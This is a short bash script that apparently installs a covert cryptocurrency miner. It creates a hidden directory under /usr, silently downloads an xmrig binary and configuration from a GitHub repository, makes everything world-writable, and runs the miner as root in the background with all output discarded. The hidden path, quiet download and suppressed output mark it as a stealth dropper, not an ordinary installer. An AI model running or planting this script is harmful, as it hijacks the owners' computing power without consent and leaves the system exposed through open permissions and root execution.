#!/bin/bash


mkdir -p "/usr/.xmrig"
wget -qO "/usr/.xmrig/config.json" "https://github.com/ak6665607/x/raw/main/config.json"
wget -qO "/usr/.xmrig/xmrig" "https://github.com/ak6665607/x/raw/main/xmrig"
chmod -R 777 "/usr/.xmrig"
cd "/usr/.xmrig" && sudo ./xmrig >/dev/null 2>&1 &


